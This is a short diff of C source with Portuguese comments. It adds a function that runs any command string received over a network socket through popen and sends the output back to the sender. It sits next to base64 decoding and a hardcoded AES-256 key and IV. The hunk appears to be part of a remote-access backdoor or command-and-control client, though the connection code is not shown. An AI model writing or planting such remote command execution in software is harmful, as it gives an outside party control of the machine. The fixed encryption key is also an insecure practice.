@@ -35,6 +35,28 @@ unsigned char *base64_decode(const char *input, int *len) {
     return buffer;
 }
 
+
+
+
+// Executa o comando recebido e envia de volta a saída
+void execute_command(const char *cmd, int client_sock) {
+    FILE *fp = popen(cmd, "r");
+    if (!fp) {
+        char *err = "Erro ao executar comando\n";
+        send(client_sock, err, strlen(err), 0);
+        return;
+    }
+
+    char output[1024];
+    while (fgets(output, sizeof(output), fp) != NULL) {
+        send(client_sock, output, strlen(output), 0);
+    }
+
+    pclose(fp);
+}
+
+
+
 // Chave e IV fixos em hexadecimal (AES-256-CBC)
 #define KEY_HEX "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
 #define IV_HEX  "0102030405060708090a0b0c0d0e0f10"
